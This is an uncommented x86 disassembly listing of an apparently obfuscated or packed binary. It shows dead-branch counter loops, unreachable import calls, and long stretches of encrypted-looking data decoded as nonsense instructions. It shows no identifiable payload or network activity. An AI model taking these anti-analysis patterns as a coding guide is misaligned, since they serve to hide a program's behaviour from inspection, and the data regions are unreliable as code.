  409a6a:	mov    ecx,0x32729a
  409a6f:	xor    edi,DWORD PTR ds:0x4336d3
  409a75:	add    edx,ecx
  409a77:	adc    edi,0x4100
  409a7d:	mov    DWORD PTR [ebp-0x8],edx
  409a80:	mov    DWORD PTR ds:0x4336bf,0x11
  409a8a:	cmp    DWORD PTR ds:0x4336bf,0x0
  409a91:	je     0x409aec
  409a97:	cmp    DWORD PTR ds:0x4336bf,0x6
  409a9e:	jne    0x409ab4
  409aa4:	push   0x53f1
  409aa9:	push   0x7cf0
  409aae:	call   DWORD PTR ds:0x412260
  409ab4:	cmp    DWORD PTR ds:0x4336bf,0x7
  409abb:	jne    0x409ad0
  409ac1:	xor    edi,edi
  409ac3:	add    edi,DWORD PTR ds:0x4336bf
  409ac9:	dec    edi
  409aca:	mov    DWORD PTR ds:0x4336bf,edi
  409ad0:	mov    edi,DWORD PTR ds:0x4336bf
  409ad6:	dec    edi
  409ad7:	mov    DWORD PTR ds:0x4336bf,edi
  409add:	jmp    0x409a8a
  409ae2:	add    DWORD PTR ds:0x4337ab,0x300c
  409aec:	mov    edx,DWORD PTR [ebp+0x8]
  409aef:	and    DWORD PTR ds:0x433723,0x0
  409af9:	jmp    0x409b0b
  409afe:	mov    edi,DWORD PTR ds:0x433723
  409b04:	inc    edi
  409b05:	mov    DWORD PTR ds:0x433723,edi
  409b0b:	cmp    DWORD PTR ds:0x433723,0x1c
  409b12:	jae    0x409b5e
  409b18:	cmp    DWORD PTR ds:0x433723,0x5
  409b1f:	jne    0x409b33
  409b25:	push   0x776c
  409b2a:	push   DWORD PTR [ebp-0x18]
  409b2d:	call   DWORD PTR ds:0x41219c
  409b33:	cmp    DWORD PTR ds:0x433723,0x4
  409b3a:	jne    0x409b4f
  409b40:	xor    edi,edi
  409b42:	xor    edi,DWORD PTR ds:0x433723
  409b48:	inc    edi
  409b49:	mov    DWORD PTR ds:0x433723,edi
  409b4f:	jmp    0x409afe
  409b54:	or     DWORD PTR ds:0x433797,0x2a5
  409b5e:	xor    edx,eax
  409b60:	or     edi,DWORD PTR ds:0x433717
  409b66:	add    edx,ecx
  409b68:	xor    edi,edi
  409b6a:	add    edi,DWORD PTR ds:0x4337af
  409b70:	or     edi,DWORD PTR ds:0x43371f
  409b76:	mov    DWORD PTR ds:0x4337af,edi
  409b7c:	mov    DWORD PTR [ebp+0xc],edx
  409b7f:	and    DWORD PTR ds:0x433723,0x414e
  409b89:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  409b90:	xor    edx,edx
  409b92:	xor    edx,DWORD PTR ds:0x4337f3
  409b98:	and    edx,DWORD PTR ds:0x4336d7
  409b9e:	mov    DWORD PTR ds:0x4337f3,edx
  409ba4:	mov    DWORD PTR [ebp-0x28],0xf89c853b
  409bab:	mov    DWORD PTR ds:0x43372f,0x15
  409bb5:	cmp    DWORD PTR ds:0x43372f,0x0
  409bbc:	je     0x409c5d
  409bc2:	cmp    DWORD PTR ds:0x43372f,0x2
  409bc9:	jne    0x409bde
  409bcf:	push   DWORD PTR [ebp-0x28]
  409bd2:	push   DWORD PTR [ebp-0x18]
  409bd5:	push   DWORD PTR [ebp-0x10]
  409bd8:	call   DWORD PTR ds:0x412264
  409bde:	cmp    DWORD PTR ds:0x43372f,0x3
  409be5:	jne    0x409bf8
  409beb:	mov    edi,DWORD PTR ds:0x43372f
  409bf1:	dec    edi
  409bf2:	mov    DWORD PTR ds:0x43372f,edi
  409bf8:	mov    edi,DWORD PTR ds:0x43372f
  409bfe:	dec    edi
  409bff:	mov    DWORD PTR ds:0x43372f,edi
  409c05:	jmp    0x409bb5
  409c0a:	and    DWORD PTR ds:0x433723,0x0
  409c14:	jmp    0x409c26
  409c19:	mov    edi,DWORD PTR ds:0x433723
  409c1f:	inc    edi
  409c20:	mov    DWORD PTR ds:0x433723,edi
  409c26:	cmp    DWORD PTR ds:0x433723,0x13
  409c2d:	jae    0x409c5d
  409c33:	cmp    DWORD PTR ds:0x433723,0x17
  409c3a:	jne    0x409c58
  409c40:	push   0x4338dd
  409c45:	push   0x4338e7
  409c4a:	push   DWORD PTR [ebp-0x1c]
  409c4d:	push   0x22b4
  409c52:	call   DWORD PTR ds:0x412268
  409c58:	jmp    0x409c19
  409c5d:	mov    DWORD PTR [ebp-0x2c],0xf89c853a
  409c64:	mov    DWORD PTR [ebp-0x30],0xf89c8539
  409c6b:	jmp    0x409fde
  409c70:	push   edx
  409c71:	jle    0x409c60
  409c73:	and    al,0x7d
  409c75:	jecxz  0x409cd4
  409c77:	push   0xffffffb4
  409c79:	inc    edx
  409c7a:	push   ds
  409c7b:	imul   edi,DWORD PTR [esp+edi*2-0x119ae7da],0x79ca7c7c
  409c86:	jl     0x409d04
  409c88:	enter  0x50a9,0xf7
  409c8c:	xchg   esi,eax
  409c8d:	adc    dh,ch
  409c8f:	aaa    
  409c90:	mov    al,0x40
  409c93:	cmc    
  409c94:	aad    0x5d
  409c96:	dec    ebp
  409c97:	in     al,0x7b
  409c99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c9a:	sub    al,0xb5
  409c9c:	inc    esi
  409c9d:	in     eax,0x58
  409c9f:	dec    esp
  409ca0:	ss iret 
  409ca2:	jb     0x409c36
  409ca4:	repz adc eax,ecx
  409ca7:	fsubrp st(0),st
  409ca9:	cmp    eax,DWORD PTR [eax-0x80]
  409cac:	rol    BYTE PTR [eax],1
  409cae:	les    edx,FWORD PTR [eax]
  409cb0:	xor    al,0xe5
  409cb2:	out    dx,al
  409cb3:	mov    ds:0xd59cc678,al
  409cb8:	mov    eax,0xa1d920df
  409cbd:	icebp  
  409cbe:	lds    ecx,FWORD PTR [ecx-0x24901eaa]
  409cc4:	aas    
  409cc5:	out    dx,al
  409cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cc7:	repz add al,0x9e
  409cca:	sub    al,0x8e
  409ccc:	fdivr  DWORD PTR [ecx-0x16ff2055]
  409cd2:	xlat   BYTE PTR ds:[ebx]
  409cd3:	or     al,0xf7
  409cd5:	sbb    eax,0x48e020aa
  409cda:	add    BYTE PTR [edi],dl
  409cdc:	pusha  
  409cdd:	adc    dh,BYTE PTR [eax-0x5e]
  409ce0:	out    dx,al
  409ce1:	mov    edx,0x39d54f79
  409ce6:	sbb    eax,0x34811efc
  409ceb:	adc    DWORD PTR [ebx],ecx
  409ced:	pop    eax
  409cee:	sar    DWORD PTR [edi+0x2e],0x26
  409cf2:	out    0xf0,al
  409cf4:	gs xchg ebx,eax
  409cf6:	jle    0x409c96
  409cf8:	inc    ebx
  409cf9:	xchg   esp,eax
  409cfa:	jmp    0x409d78
  409cfc:	pop    ebp
  409cfd:	retf   0xbf8f
  409d00:	or     al,0x18
  409d02:	and    esi,DWORD PTR [ebx-0x26]
  409d05:	mov    eax,0xfe119a0
  409d0a:	or     eax,0xd182217d
  409d0f:	cmp    ah,BYTE PTR [ebx-0x21]
  409d12:	push   cs
  409d13:	je     0x409d86
  409d15:	ret    
  409d16:	jae    0x409d94
  409d18:	pop    eax
  409d19:	daa    
  409d1a:	cmp    ecx,DWORD PTR [edx+0x27]
  409d1d:	push   edi
  409d1e:	fimul  WORD PTR [edx-0x6c7f46e4]
  409d24:	fadd   st(7),st
  409d26:	leave  
  409d27:	test   al,0xa4
  409d29:	imul   edi,DWORD PTR [edx-0x66],0xffffffce
  409d2d:	imul   esp,DWORD PTR [ebx],0x31
  409d30:	in     eax,0xc6
  409d32:	and    BYTE PTR [ecx+0x48],bh
  409d35:	push   es
  409d36:	push   esp
  409d37:	pop    ebx
  409d38:	sbb    al,BYTE PTR [eax+0x779cd889]
  409d3e:	jns    0x409da3
  409d40:	mov    cl,0x48
  409d42:	xchg   DWORD PTR [esi+0x71],eax
  409d45:	sub    cl,cl
  409d47:	lods   al,BYTE PTR ds:[esi]
  409d48:	into   
  409d49:	jecxz  0x409da2
  409d4b:	adc    eax,0x51154fd8
  409d50:	(bad)  
  409d52:	pop    ecx
  409d53:	dec    esp
  409d54:	push   es
  409d55:	push   edi
  409d56:	mov    eax,ds:0x9de216e7
  409d5b:	into   
  409d5c:	cs in  eax,0xac
  409d5f:	jb     0x409d18
  409d61:	pop    ebp
  409d62:	mov    ch,bl
  409d64:	in     eax,dx
  409d65:	loopne 0x409d8e
  409d67:	xor    bh,BYTE PTR [esi-0x3c]
  409d6a:	cmp    DWORD PTR [esi+0x14],esi
  409d6d:	ror    DWORD PTR [ebp-0x4135681e],cl
  409d73:	int    0xa8
  409d75:	jb     0x409d97
  409d77:	aaa    
  409d78:	ss mov edx,0x3682a590
  409d7e:	retf   
  409d7f:	scas   al,BYTE PTR es:[edi]
  409d80:	mov    edx,0xc98e1da6
  409d85:	fistp  DWORD PTR [esi-0x333667da]
  409d8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d8c:	and    BYTE PTR [eax-0x20657f97],bl
  409d92:	ja     0x409d60
  409d94:	frstor [edi+0x40]
  409d97:	in     eax,dx
  409d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d99:	xlat   BYTE PTR ds:[ebx]
  409d9a:	(bad)  
  409d9b:	int3   
  409d9c:	ftst   
  409d9e:	out    dx,eax
  409d9f:	mov    edi,0x4e0cd5f3
  409da4:	jle    0x409d8a
  409da6:	mov    esi,0xd4f26d29
  409dab:	mov    ecx,0xd17cda9d
  409db0:	jmp    0x710a:0xf2ec7015
  409db7:	out    dx,al
  409db8:	lahf   
  409db9:	scas   al,BYTE PTR es:[edi]
  409dba:	sbb    cl,BYTE PTR [ebx+ebx*2+0x3b]
  409dbe:	pop    ebp
  409dbf:	pop    ebp
  409dc0:	or     edx,edx
  409dc2:	pop    ebp
  409dc3:	push   ss
  409dc4:	mov    al,0xb6
  409dc6:	bound  esi,QWORD PTR [edi+0x3]
  409dc9:	mov    WORD PTR [edi+0x795e6cfe],cs
  409dcf:	sub    DWORD PTR [eax+eiz*2-0xfcc8014],eax
  409dd6:	jle    0x409e3c
  409dd8:	loop   0x409d8c
  409dda:	mov    ds:0xe78d8464,al
  409ddf:	sbb    esp,DWORD PTR [edi-0x7d67d950]
  409de5:	and    al,bh
  409de7:	in     eax,0xa1
  409de9:	ss loop 0x409de1
  409dec:	push   esp
  409ded:	dec    ecx
  409dee:	jae    0x409e55
  409df0:	mov    al,ds:0x1c633092
  409df5:	fisub  DWORD PTR [edx-0x50]
  409df8:	pop    eax
  409df9:	retf   0xc074
  409dfc:	pop    es
  409dfd:	pop    ds
  409dfe:	lds    esp,FWORD PTR ds:0xde8e5fd5
  409e04:	repnz sbb al,0x80
  409e07:	pop    ebx
  409e08:	lea    eax,[edi-0x8]
  409e0b:	jno    0x409da4
  409e0d:	scas   eax,DWORD PTR es:[edi]
  409e0e:	rcl    BYTE PTR [eax+eiz*1-0xe],cl
  409e12:	cmp    dl,al
  409e14:	(bad)  
  409e15:	mov    edx,0x7b7e16d1
  409e1a:	jo     0x409dcd
  409e1c:	(bad)  
  409e1d:	cmc    
  409e1e:	leave  
  409e1f:	dec    ecx
  409e20:	and    BYTE PTR [edx-0x628547d2],bh
  409e26:	rol    DWORD PTR [esp+esi*2-0x6],0x5f
  409e2b:	jb     0x409df4
  409e2d:	mov    ah,0x2a
  409e2f:	mov    WORD PTR [edx],ds
  409e31:	dec    edx
  409e32:	call   0x9337:0xabb3c956
  409e39:	mov    BYTE PTR [edi-0x2a70a746],0x29
  409e40:	pop    esp
  409e41:	cs (bad) 
  409e43:	jmp    0x409e9a
  409e45:	mov    dh,0x3d
  409e47:	enter  0xe526,0xdf
  409e4b:	push   0xe7202eb
  409e50:	das    
  409e51:	nop
  409e52:	in     al,dx
  409e53:	in     eax,0xc9
  409e55:	fisttp QWORD PTR [ebp-0xa]
  409e58:	std    
  409e59:	sbb    dh,cl
  409e5b:	sti    
  409e5c:	loop   0x409ebc
  409e5e:	and    ch,bl
  409e60:	or     ch,dh
  409e62:	jmp    0x409df3
  409e64:	ja     0x409e73
  409e66:	imul   eax,eax,0x29d2dfc0
  409e6c:	ror    dl,1
  409e6e:	repz sahf 
  409e70:	mov    DWORD PTR [ecx+ecx*8],eax
  409e73:	sub    dl,dl
  409e75:	mov    bh,0xb6
  409e77:	mov    ds:0xba0c6c0,al
  409e7c:	fiadd  DWORD PTR [edx+0x71ebe2d3]
  409e82:	ret    
  409e83:	or     bh,BYTE PTR [ebp+0x41]
  409e86:	xor    edx,eax
  409e88:	xchg   DWORD PTR [edx-0x5c],ebp
  409e8b:	ret    
  409e8c:	aam    0xd0
  409e8e:	test   al,0xe6
  409e90:	push   edx
  409e91:	data16 cmp BYTE PTR [ecx],dl
  409e94:	and    bl,bl
  409e96:	in     al,0x36
  409e98:	enter  0x1382,0xb8
  409e9c:	imul   eax,DWORD PTR [edx+ebx*2+0x2b0182b4],0x338db0ea
  409ea7:	push   ecx
  409ea8:	test   eax,0xf60879e1
  409ead:	not    BYTE PTR [edx+0x4e728782]
  409eb3:	xchg   esp,eax
  409eb4:	lods   al,BYTE PTR ds:[esi]
  409eb5:	leave  
  409eb6:	ror    BYTE PTR [ebx],cl
  409eb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409eb9:	pop    esi
  409eba:	pop    edx
  409ebb:	push   edx
  409ebc:	cmp    BYTE PTR [ecx+esi*8+0x20763679],dh
  409ec3:	inc    ebx
  409ec4:	into   
  409ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ec6:	clc    
  409ec7:	stos   BYTE PTR es:[edi],al
  409ec8:	es jo  0x409ed9
  409ecb:	das    
  409ecc:	inc    edi
  409ecd:	cmp    DWORD PTR [eax],ebp
  409ecf:	push   ebp
  409ed0:	ficom  WORD PTR [edx-0x222985ee]
  409ed6:	outs   dx,BYTE PTR ds:[esi]
  409ed7:	xor    edi,esp
  409ed9:	fcmovnb st,st(7)
  409edb:	cwde   
  409edc:	jno    0x409f5b
  409ede:	push   0xffffffb5
  409ee0:	mov    ecx,cs
  409ee2:	push   ds
  409ee3:	cli    
  409ee4:	xlat   BYTE PTR ds:[ebx]
  409ee5:	(bad)  
  409ee6:	call   0x6083ec08
  409eeb:	call   0x8502:0x57467232
  409ef2:	test   eax,0xffc2144b
  409ef7:	repz sti 
  409ef9:	jmp    0x70bd:0x981fc0c0
  409f00:	dec    ebx
  409f01:	or     eax,0x1ecfcc45
  409f06:	xor    ecx,DWORD PTR [edi+0x61]
  409f09:	outs   dx,BYTE PTR ds:[esi]
  409f0a:	cmp    DWORD PTR [edx+0x1842b45b],eax
  409f10:	leave  
  409f11:	in     al,0xa7
  409f13:	pop    edi
  409f14:	sbb    ebp,DWORD PTR [esi+esi*8-0x2e7ea1b2]
  409f1b:	inc    ebx
  409f1c:	stos   DWORD PTR es:[edi],eax
  409f1d:	xchg   ebp,eax
  409f1e:	addr16 std 
  409f20:	dec    eax
  409f21:	fnop   
  409f23:	mov    eax,0xe3cae2a1
  409f28:	mov    cl,0x5
  409f2a:	mov    BYTE PTR [edi+0x52cd560b],bh
  409f30:	push   0x1ded0b7b
  409f35:	gs dec ebx
  409f37:	jmp    0x409f70
  409f39:	sbb    edx,DWORD PTR [edi-0x35]
  409f3c:	cmp    eax,0x6bddd56b
  409f41:	lea    ebp,[esi+0x6484f0b6]
  409f47:	cmp    eax,0x24ab03ea
  409f4c:	add    BYTE PTR [ecx-0x2d],ch
  409f4f:	push   esi
  409f50:	rol    DWORD PTR [edi+0x864b208],1
  409f56:	mov    edx,0x4879bbdf
  409f5b:	bound  esp,QWORD PTR [ecx-0x57953c56]
  409f61:	push   ecx
  409f62:	out    dx,eax
  409f63:	sti    
  409f64:	loop   0x409eeb
  409f66:	jb     0x409fe1
  409f68:	mov    esi,esi
  409f6a:	loop   0x409f50
  409f6c:	les    ebp,FWORD PTR [ecx-0x51]
  409f6f:	scas   eax,DWORD PTR es:[edi]
  409f70:	mov    dl,0xbe
  409f72:	and    DWORD PTR [edi-0x10852dc1],edx
  409f78:	adc    edx,esp
  409f7a:	les    edx,FWORD PTR [edx-0x7fde5e6a]
  409f80:	xchg   BYTE PTR [ebp+esi*2-0x32dd200c],cl
  409f87:	pusha  
  409f88:	and    eax,0x41b80125
  409f8d:	pop    ds
  409f8e:	daa    
  409f8f:	ja     0x409fe7
  409f91:	dec    ebp
  409f92:	dec    ecx
  409f93:	push   0xb9cbff5e
  409f98:	mov    edx,0x13f508ef
  409f9d:	sub    bh,BYTE PTR [edx-0x4c47194e]
  409fa3:	sub    al,0x9
  409fa5:	loope  0x409ffd
  409fa7:	enter  0xcafe,0x8a
  409fab:	sub    DWORD PTR [esi+0x1286b79b],ebx
  409fb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fb2:	cld    
  409fb3:	icebp  
  409fb4:	adc    al,0x9c
  409fb6:	hlt    
  409fb7:	pop    es
  409fb8:	inc    edi
  409fb9:	or     bl,BYTE PTR [ebx+0x4133b2c4]
  409fbf:	xor    ch,ch
  409fc1:	xor    dl,BYTE PTR [ebp-0x41]
  409fc4:	lea    edi,[eax+edi*1-0x1a738630]
  409fcb:	or     eax,0x5db47c4c
  409fd0:	and    DWORD PTR [ebx+0x2],ebx
  409fd3:	outs   dx,DWORD PTR ds:[esi]
  409fd4:	mov    dh,0x88
  409fd6:	arpl   WORD PTR [edx-0x2b],bx
  409fd9:	mov    eax,ds:0xa4f8a2b1
  409fde:	mov    DWORD PTR [ebp-0x34],0xf89c8538
  409fe5:	and    DWORD PTR ds:0x4337a3,0x0
  409fef:	jmp    0x40a001
  409ff4:	mov    edx,DWORD PTR ds:0x4337a3
  409ffa:	inc    edx
  409ffb:	mov    DWORD PTR ds:0x4337a3,edx
  40a001:	cmp    DWORD PTR ds:0x4337a3,0x16
  40a008:	jae    0x40a02b
  40a00e:	cmp    DWORD PTR ds:0x4337a3,0x18
  40a015:	jne    0x40a026
  40a01b:	push   0x35b9
  40a020:	call   DWORD PTR ds:0x41226c
  40a026:	jmp    0x409ff4
  40a02b:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a032:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a039:	movzx  edx,BYTE PTR ds:0x4337f3
  40a040:	adc    edx,DWORD PTR ds:0x4337ab
  40a046:	mov    DWORD PTR ds:0x4337f3,edx
  40a04c:	mov    edx,DWORD PTR [ebp+0x8]
  40a04f:	xor    edx,eax
  40a051:	mov    edi,DWORD PTR [ebp-0x10]
  40a054:	add    edx,ecx
  40a056:	cmp    edi,edx
  40a058:	je     0x40d768
  40a05e:	mov    DWORD PTR ds:0x4336d7,0x2fff
  40a068:	push   ebx
  40a069:	jmp    0x40d743
  40a06e:	movzx  edi,BYTE PTR ds:0x43375f
  40a075:	xor    DWORD PTR ds:0x433733,edi
  40a07b:	mov    edx,DWORD PTR [ebp-0x8]
  40a07e:	mov    edi,DWORD PTR [ebp-0x10]
  40a081:	sub    DWORD PTR ds:0x4336d3,0x7416
  40a08b:	sub    edi,edx
  40a08d:	movzx  edx,WORD PTR ds:0x4337eb
  40a094:	xor    DWORD PTR ds:0x4337db,edx
  40a09a:	jmp    0x40a40d
  40a09f:	push   edi
  40a0a0:	mov    dh,0x10
  40a0a2:	sti    
  40a0a3:	std    
  40a0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a5:	push   edi
  40a0a6:	jb     0x40a085
  40a0a8:	xor    dl,BYTE PTR [ecx+0x4e]
  40a0ab:	sbb    BYTE PTR [edx],0xfe
  40a0ae:	js     0x40a0e3
  40a0b0:	jmp    0x7c7c:0x79ca7c7c
  40a0b7:	jb     0x40a05f
  40a0b9:	adc    DWORD PTR [ebx+0x4803034d],ebp
  40a0bf:	cs aad 0xa6
  40a0c2:	push   es
  40a0c3:	ja     0x40a0d2
  40a0c5:	sub    eax,0xf98f63e9
  40a0ca:	mov    edx,0x6fa8b342
  40a0cf:	push   cs
  40a0d0:	add    eax,0x308ac4d5
  40a0d5:	push   ss
  40a0d6:	lods   eax,DWORD PTR ds:[esi]
  40a0d7:	jmp    0x40a069
  40a0d9:	jae    0x40a0fe
  40a0db:	and    al,0xcc
  40a0dd:	cmp    dh,BYTE PTR [edi+ebx*2]
  40a0e0:	dec    edx
  40a0e1:	jmp    0x40a117
  40a0e3:	sub    esp,ebp
  40a0e5:	pop    ebp
  40a0e6:	aad    0x22
  40a0e8:	inc    esp
  40a0e9:	fimul  WORD PTR [ebx]
  40a0eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0ec:	rol    ch,1
  40a0ee:	dec    ecx
  40a0ef:	pop    esp
  40a0f0:	stc    
  40a0f1:	repnz mov BYTE PTR [ebp+0x244bb5c2],ah
  40a0f8:	out    dx,al
  40a0f9:	std    
  40a0fa:	cmp    ecx,edi
  40a0fc:	daa    
  40a0fd:	sbb    esp,esi
  40a0ff:	shl    BYTE PTR [ebx],1
  40a101:	mov    al,ds:0xb5cde06e
  40a106:	add    al,0x4b
  40a108:	retf   
  40a109:	test   BYTE PTR [eax-0x57],bl
  40a10c:	jns    0x40a166
  40a10e:	or     ebp,DWORD PTR [eax+ebx*4]
  40a111:	icebp  
  40a112:	aad    0x50
  40a114:	pop    ds
  40a115:	rol    al,1
  40a117:	or     al,0x62
  40a119:	dec    ebp
  40a11a:	lds    eax,FWORD PTR [ecx+0x6c0d9d08]
  40a120:	ret    0x7e06
  40a123:	(bad)  
  40a124:	lds    esi,FWORD PTR [ebp-0x56325eaf]
  40a12a:	push   cs
  40a12b:	daa    
  40a12c:	push   eax
  40a12d:	mov    edx,0xc966e2df
  40a132:	add    DWORD PTR ds:0xa3c45f78,esi
  40a138:	mov    WORD PTR [edi-0x1],ss
  40a13b:	mov    edx,DWORD PTR [edi]
  40a13d:	scas   al,BYTE PTR es:[edi]
  40a13e:	(bad)  
  40a13f:	mov    ebp,0x321d03f6
  40a144:	outs   dx,DWORD PTR cs:[esi]
  40a146:	add    eax,0xffe0ace0
  40a14b:	mov    dl,0x97
  40a14d:	nop
  40a14e:	push   eax
  40a14f:	add    eax,0xe05e02ed
  40a154:	test   al,0x9b
  40a156:	scas   eax,DWORD PTR es:[edi]
  40a157:	and    eax,0x2cd6a354
  40a15c:	out    0xd0,eax
  40a15e:	lahf   
  40a15f:	fdiv   st,st(6)
  40a161:	cwde   
  40a162:	repz les ebp,FWORD PTR [bp-0x86]
  40a168:	outs   dx,BYTE PTR ds:[esi]
  40a169:	mov    DWORD PTR [ebx-0x1036192d],eax
  40a16f:	idiv   bh
  40a171:	add    al,0xd1
  40a173:	xchg   ch,cl
  40a175:	lock sbb DWORD PTR ds:0x60e7514c,edi
  40a17c:	mov    ch,0x2f
  40a17e:	xchg   ebx,eax
  40a17f:	add    ebx,DWORD PTR [ecx+0x53acd971]
  40a185:	mov    DWORD PTR [esi],ebx
  40a187:	pushf  
  40a188:	neg    BYTE PTR [ebx]
  40a18a:	shr    BYTE PTR [ecx+0x7e1f367c],0x73
  40a191:	or     eax,0xe0e650f0
  40a196:	or     eax,0xd2e2acf0
  40a19b:	mov    DWORD PTR [esi-0x7fabf87],eax
  40a1a1:	fstp   DWORD PTR [eax]
  40a1a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1a4:	xchg   ebp,eax
  40a1a5:	inc    ebp
  40a1a6:	mul    BYTE PTR [ebp-0x3d]
  40a1a9:	jo     0x40a200
  40a1ab:	imul   DWORD PTR [ecx]
  40a1ad:	pop    ds
  40a1ae:	adc    edx,ebp
  40a1b0:	cs aad 0x5b
  40a1b3:	retf   
  40a1b4:	in     al,0xf
  40a1b6:	dec    eax
  40a1b7:	push   esi
  40a1b8:	mov    esi,DWORD PTR [eax]
  40a1ba:	mov    ch,0x8c
  40a1bc:	sahf   
  40a1bd:	mov    DWORD PTR [eax-0x72a81f54],edx
  40a1c3:	xor    esp,ebx
  40a1c5:	push   esp
  40a1c6:	or     ch,dl
  40a1c8:	sub    eax,0x90d3ce0a
  40a1cd:	outs   dx,DWORD PTR ds:[esi]
  40a1ce:	data16 (bad) 
  40a1d0:	in     eax,0xcb
  40a1d2:	bound  esp,QWORD PTR [esi-0x2fbaac8f]
  40a1d8:	pop    ebx
  40a1d9:	inc    ecx
  40a1da:	xchg   edx,eax
  40a1db:	jae    0x40a21d
  40a1dd:	push   ds
  40a1de:	sahf   
  40a1df:	mov    dl,BYTE PTR [ecx+edi*1]
  40a1e2:	test   BYTE PTR ds:0x173c38c5,bh
  40a1e8:	je     0x40a235
  40a1ea:	or     DWORD PTR [esi+0x9a3b177],edx
  40a1f0:	fisttp WORD PTR [esi+0x368efeed]
  40a1f6:	iret   
  40a1f7:	dec    edi
  40a1f8:	std    
  40a1f9:	fidivr WORD PTR [edx-0x392c3b28]
  40a1ff:	clc    
  40a200:	xchg   ecx,eax
  40a201:	repz xchg edx,eax
  40a203:	hlt    
  40a204:	aad    0xc7
  40a206:	fwait
  40a207:	pop    esi
  40a208:	add    al,0xe4
  40a20a:	and    cl,dl
  40a20c:	in     eax,dx
  40a20d:	xchg   esp,eax
  40a20e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a20f:	mov    ds:0x847630f2,al
  40a214:	sti    
  40a215:	mov    edx,0x7f4002f1
  40a21a:	or     DWORD PTR [edi-0x7a15553],edi
  40a220:	push   ebp
  40a221:	scas   al,BYTE PTR es:[edi]
  40a222:	cmp    BYTE PTR [edi],0x20
  40a225:	jbe    0x40a1e8
  40a227:	(bad)  
  40a228:	xor    ch,BYTE PTR ds:0xd1c39b94
  40a22e:	lods   eax,DWORD PTR ds:[esi]
  40a22f:	enter  0xa894,0xdd
  40a233:	(bad)  
  40a234:	in     eax,dx
  40a235:	fwait
  40a236:	ins    DWORD PTR es:[edi],dx
  40a237:	jecxz  0x40a299
  40a239:	test   eax,0x1d3466ee
  40a23e:	xchg   ebx,eax
  40a23f:	jne    0x40a1d8
  40a241:	ret    
  40a242:	sbb    eax,0x9908bc64
  40a247:	xor    dh,BYTE PTR [ebx+eax*8-0xf]
  40a24b:	jno    0x40a257
  40a24d:	adc    DWORD PTR [eax+0x5f],edx
  40a250:	clc    
  40a251:	inc    esp
  40a252:	cmp    eax,0xe468dbb6
  40a257:	stos   DWORD PTR es:[edi],eax
  40a258:	leave  
  40a259:	lahf   
  40a25a:	or     BYTE PTR [ecx],bl
  40a25c:	out    0x1d,al
  40a25e:	and    eax,0x472b733c
  40a263:	mov    dl,0x23
  40a265:	sbb    bh,BYTE PTR [ebp-0x7f]
  40a268:	(bad)  [esp+edx*4+0x42]
  40a26c:	int3   
  40a26d:	jle    0x40a2e7
  40a26f:	dec    ebx
  40a270:	fdivr  QWORD PTR [edi+0x40e03397]
  40a276:	rcl    DWORD PTR [ebx+0x69],0x85
  40a27a:	or     bl,BYTE PTR [ebx-0x62]
  40a27d:	retf   0xaabe
  40a280:	or     al,0xd
  40a282:	add    eax,0x4948638b
  40a287:	adc    al,0x22
  40a289:	jp     0x40a25f
  40a28b:	fld    DWORD PTR [esi-0x172bf20e]
  40a291:	fwait
  40a292:	mov    eax,ds:0xe26d4c74
  40a297:	stc    
  40a298:	or     eax,0x60b64af1
  40a29d:	cld    
  40a29e:	rcr    BYTE PTR [edx+eax*2-0x561e41c1],1
  40a2a5:	ins    DWORD PTR es:[edi],dx
  40a2a6:	sub    eax,0x50e18aa7
  40a2ab:	push   cs
  40a2ac:	stc    
  40a2ad:	pop    edi
  40a2ae:	sar    DWORD PTR [eax],0x59
  40a2b1:	div    esp
  40a2b3:	xor    ecx,esi
  40a2b5:	inc    ebp
  40a2b6:	fsubrp st(1),st
  40a2b8:	out    0x5a,eax
  40a2ba:	and    al,BYTE PTR [edx]
  40a2bc:	push   esi
  40a2bd:	lahf   
  40a2be:	ins    BYTE PTR es:[edi],dx
  40a2bf:	vpsubw xmm2,xmm6,XMMWORD PTR [esi+eiz*2+0x45af0a6a]
  40a2c8:	mov    eax,0x7aacc852
  40a2cd:	mov    BYTE PTR [edi-0x2d],0x2d
  40a2d1:	pop    edi
  40a2d2:	pop    ss
  40a2d3:	inc    eax
  40a2d4:	add    bh,al
  40a2d6:	dec    edx
  40a2d7:	jbe    0x40a358
  40a2d9:	mov    esi,0xbde4ff02
  40a2de:	jno    0x40a28f
  40a2e0:	xor    eax,esp
  40a2e2:	cwde   
  40a2e3:	xchg   edi,eax
  40a2e4:	mov    cl,0x63
  40a2e6:	das    
  40a2e7:	dec    esi
  40a2e8:	xchg   esp,eax
  40a2e9:	mov    ecx,0x7d256aba
  40a2ee:	fwait
  40a2ef:	pop    eax
  40a2f0:	mov    ebx,0xf6770de5
  40a2f5:	adc    ch,BYTE PTR [ecx]
  40a2f7:	(bad)  
  40a2f8:	jno    0x40a335
  40a2fa:	fsub   st(2),st
  40a2fc:	cwde   
  40a2fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2fe:	shl    BYTE PTR [ecx],0x40
  40a301:	inc    ecx
  40a302:	retf   
  40a303:	or     edx,edx
  40a305:	mov    dl,0xaa
  40a307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a308:	xchg   bl,bh
  40a30a:	cli    
  40a30b:	mov    edx,0x3b39c580
  40a310:	les    esp,FWORD PTR [esi+0x38d35c6c]
  40a316:	pop    ds
  40a317:	mov    cl,0xb2
  40a319:	sub    esi,ebx
  40a31b:	addr16 fs mov cl,0x71
  40a31f:	ds jg  0x40a345
  40a322:	ds leave 
  40a324:	(bad)  
  40a325:	push   eax
  40a326:	stos   DWORD PTR es:[edi],eax
  40a327:	mov    ds:0x7732c116,eax
  40a32c:	out    dx,eax
  40a32d:	ret    
  40a32e:	mov    al,0x39
